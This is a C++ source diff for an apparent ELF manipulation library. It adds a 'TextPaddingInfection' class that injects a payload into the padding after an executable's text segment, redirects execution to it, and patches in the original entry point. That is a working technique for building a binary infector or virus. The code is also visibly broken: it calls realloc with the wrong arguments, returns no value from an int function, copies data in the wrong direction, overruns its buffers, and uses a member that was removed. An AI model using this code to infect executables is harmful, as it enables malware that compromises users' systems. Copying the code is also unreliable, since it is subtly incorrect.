@@ -1,22 +1,52 @@
 #include "zkelf.hh"
 
+int Binary::PatchAddress(u8 *buffer, size_t len, u8 *addr, u8 *magic)
+{
+    for(int i = 0; i < len; i++){
+        if(buffer[i] == magic[0] && buffer[i + 1] == magic[1]){
+            for(int j = 0; j < ADDR_LEN && i < len; j++, i++){
+                buffer[i] = addr[j];
+            }
+            return 0;
+        }
+    }
+    std::cerr << "keyword not found\n";
+    return -1;
+}
+
 Binary::Elf::Elf()
-    :elf_memmap(nullptr), elf_pathname(nullptr), elf_ehdr(nullptr),
-    elf_phdr(nullptr), elf_shdr(nullptr), elf_size(0), elf_baseaddr(0)
+    :elf_memmap(nullptr), elf_pathname(nullptr), elf_baseaddr(0), 
+    elf_ehdr(nullptr), elf_phdr(nullptr), elf_shdr(nullptr), elf_size(0)
 {}
 
 Binary::Elf::Elf(const char *pathname)
-    :elf_memmap(nullptr), elf_pathname(pathname), elf_ehdr(nullptr),
-    elf_phdr(nullptr), elf_shdr(nullptr), elf_size(0), elf_baseaddr(0)
+    :elf_memmap(nullptr), elf_pathname(pathname), elf_baseaddr(0),
+    elf_ehdr(nullptr), elf_phdr(nullptr), elf_shdr(nullptr), elf_size(0) 
 {
     try{
         OpenElf();
         LoadFile();
     } catch (std::exception& e) {
         std::cerr << e.what();
-        RemoveMap();
+        try{
+            RemoveMap();
+        } catch (std::exception& e){
+            goto err;
+        }
+err:
         std::abort();
     }
+}
+
+Binary::Elf::~Elf()
+{
+    try{
+        RemoveMap();
+    } catch(std::exception& e){
+        std::cout << e.what();
+        std::abort();
+    }
+
 }
 
 void Binary::Elf::OpenElf(void)
@@ -78,7 +108,6 @@ int Binary::Elf::FindSegmentbyAttr(u32 type, u32 flags) const
             return i;
         }
     }
-
     return -1;
 }
 
@@ -104,7 +133,6 @@ void *Binary::Elf::ElfRead(off_t readoff, size_t size) const
     for(int i = readoff; i < readoff + size; i++){
         buffer[i] = memmap[i];
     }
-
     return buffer;
 }
 
@@ -115,15 +143,44 @@ void Binary::Elf::ElfWrite(void *buffer, off_t writeoff, size_t size)
     u8 *_buffer = (u8 *)buffer;
     for(int i = 0; i < writeoff + size; i++){
         _buffer[i] = memmap[i];
-    } 
+    }
 }
 
-Binary::TextPaddingInfection::TextPaddingInfection(char *target)
-    :Elf(target), tpi_shellcode(nullptr), tpi_orgentry(0), 
-    tpi_fakeetry(0)
-{}
+Binary::TextPaddingInfection::TextPaddingInfection(const char *target)
+    :Elf(target), tpi_payload(nullptr), tpi_fake_entry(0), 
+    tpi_payload_sz(0)
+{
+    char buf[ADDR_LEN];
+    sprintf(buf, "%lx", elf_ehdr->e_entry);
+    for(int i = 0; i < ADDR_LEN; i++){
+        if(buf[i] >= 0x61 && buf[i] <= 0x66)
+            tpi_org_entry[i] = buf[i] - 87;
+        else if(buf[i] >= 0x30 && buf[i] <= 0x39)
+            tpi_org_entry[i] = buf[i] - 48;
+        else
+            ERROR(std::runtime_error("original entry point is weird\n"));
+    }
+}
 
-off_t Binary::TextPaddingInfection::FindFreeSpace(int size) const
+Binary::TextPaddingInfection::~TextPaddingInfection()
+{
+    if(tpi_payload)
+        free(tpi_payload);
+}
+
+/* assumed payload is a heap allocated memory chunk */
+void Binary::TextPaddingInfection::SetPayload(u8 *payload, size_t
+        payload_sz)
+{
+    /* total size of shellcode should be payload_sz - MAGIC_LEN + ADDR_LEN
+     */
+    tpi_payload_sz = payload_sz - MAGIC_LEN + ADDR_LEN;
+    tpi_payload = realloc(payload, tpi_payload_sz, (sizeof(u8)));
+    if(tpi_payload == nullptr)
+        ERROR(std::bad_alloc());
+}
+
+off_t Binary::TextPaddingInfection::FindFreeSpace(void)
 {
     /* text segment has permission bits set to read and exec */
     int text_index = FindSegmentbyAttr(PT_LOAD, PF_X | PF_R);
@@ -136,13 +193,23 @@ off_t Binary::TextPaddingInfection::FindFreeSpace(int size) const
     assert(text_index + 1 == data_index);
     int available_space = elf_phdr[data_index].p_offset - 
         elf_phdr[text_index].p_offset;
-    assert(available_space >= size && "available free space is less     \
-            than size");
+    assert(available_space >= tpi_payload_sz && "available free space   \
+            is less than size");
+    tpi_fake_entry = elf_phdr[text_index].p_vaddr + elf_phdr[text_index]
+        .p_memsz;
     return elf_phdr[text_index].p_offset + elf_phdr[text_index].
         p_filesz;
 }
 
-Binary::TextPaddingInfection::InjectCode(void)
+int Binary::TextPaddingInfection::InjectPayload(off_t writeoff, size_t
+    size) const
 {
+    if(PatchAddress(tpi_payload, tpi_payload_sz, tpi_org_entry, 
+        tpi_magic) < 0){
+        std::cerr << "injection failed\n";
+        return;
+    }
+
+    ElfWrite(tpi_shellcode, writeoff, size);
 
 }
